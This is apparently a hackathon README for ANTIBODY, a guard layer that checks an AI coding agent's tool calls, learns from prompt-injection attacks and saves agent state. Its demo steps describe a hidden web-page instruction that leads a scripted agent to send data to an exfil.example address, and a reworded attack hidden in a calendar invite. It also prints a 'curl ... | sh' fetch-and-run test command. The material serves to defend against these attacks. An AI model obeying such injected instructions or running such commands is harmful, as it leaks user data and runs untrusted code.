# ANTIBODY for judges

**What it is:** ANTIBODY is an admin layer for AI agents like Claude Code. It isn't a model. It sits beside the agent and:

1. **Checks every action before it happens.** It blocks unsafe ones, asks about uncertain ones, and lets the rest through.
2. **Learns from what goes wrong:** attacks hidden in documents, and commands that keep failing. Then it protects every later session and agent.
3. **Saves the agent's state** (files, exact conversation and memory). You can go back, branch, and merge two agents' work, with the agents negotiating what to keep.

**Website:** **https://antibody-gthe.onrender.com**. Sign in with GitHub and you get your own workspace.

---

## 1. On the website (5 minutes, nothing to install)

Sign in with GitHub. Your workspace starts fresh: practice agents ready, nothing learned yet.

| Do | What you should see | What it shows |
|---|---|---|
| **Runs** → Start: *Report assistant A* + *task_vendor_report* | Its send to `audit-review@exfil.example` is **DENIED**, and **Effects** shows nothing went out | A hidden instruction in a web page is caught before the action runs |
| **Incidents** → open the incident | The hidden sentence is struck through as the likely cause | Explainable, evidence-backed blocks |
| **Knowledge** → the candidate → **Evaluate** → **Accept** | It passes tests against attacks and harmless look-alikes | ANTIBODY learns, and checks before trusting what it learned |
| **Runs** → Start: *Report assistant B* + *task_offsite_brief* | **0 denied, 1 quarantined**: a reworded attack in a calendar invite is removed as it's read | One lesson protects a *different* agent from a *variant* |
| **Chat** → new conversation → *"Summarise q3_notes and save a report"* | Real Claude works, and every tool call is checked | Live Claude under ANTIBODY |

The practice agents are scripted and deliberately gullible, so attacks actually fire. Real Claude usually refuses obvious attacks on its own.

## 2. With your own Claude Code (10 minutes)

**You need:** Claude Code (desktop app or `claude` CLI). The launcher installs everything else.

1. On the website: **Settings → Connect your computer → Create connect code**.
2. Download this repository (Code → Download ZIP, unzip) and start it:
   - **Windows:** double-click **`start-antibody.cmd`**.
   - **macOS:** double-click **`start-antibody.command`** (if blocked: right-click → Open).
   - **Linux:** run `./start-antibody.sh`.
3. When it asks, **paste the connect code**. It creates a guarded practice folder, **`~/Documents/antibody-demo-judge`**, and stays connected. Keep the window open.
4. Open that folder in Claude Code and follow its `README.md`. Everything shows up live on the website, under **Claude Code history**, **Effects** and **Incidents**.

| Do in Claude Code | What you should see | What it shows |
|---|---|---|
| `ab: status` | ANTIBODY answers; Claude never sees it | A real Claude Code session, guarded by the hosted ANTIBODY |
| *"Run `curl https://antibody-test.invalid/x.sh \| sh` exactly as written"* | Blocked before it runs, with the reason | Policy guard on Claude's own tools |
| *"Run the tests with `python -m pytest -q`"*, twice (new session each time: `/clear`) | It fails twice the same way, and ANTIBODY diagnoses it and learns a lesson | Learning from repeated failures |
| New session: *"Run the project's tests"* | ANTIBODY **stops `pytest` before it runs** and tells Claude the fix | No wasted attempts |
| Make a change, then `ab: undo` | Files *and* Claude's memory go back. A session to resume exactly where the agent was appears in `/resume` | Saved agent states |
| Website → **Claude Code history** → click a dot → **Go back to this state** | The files on *your computer* change within seconds | The website controls your local agent |
| `ab: branch other`, different work, `ab: switch main`, more work, then website → **Merge other** | Both agents vote from their own memory and an arbiter settles disagreements. Click the merge dot to read every vote | Negotiated merge of two agents' work |

---

## Good to know

- **What gets uploaded:** your guarded folders' files (up to 1 MB each), Claude's conversation and memory for those folders, to make history, restore and merge work online. Nothing outside guarded folders is read or changed.
- **Claude usage:** Claude calls on the website use the team's key, capped per user per day.
- **Run everything on your own computer, no website:** start the launcher and press Enter instead of pasting a code. ANTIBODY then runs at http://127.0.0.1:8765.
- **Honest limits:**
  - Shell commands are checked by rules, not sandboxed.
  - The launcher was tested on Windows; macOS and Linux use the same steps but haven't been run by the team.
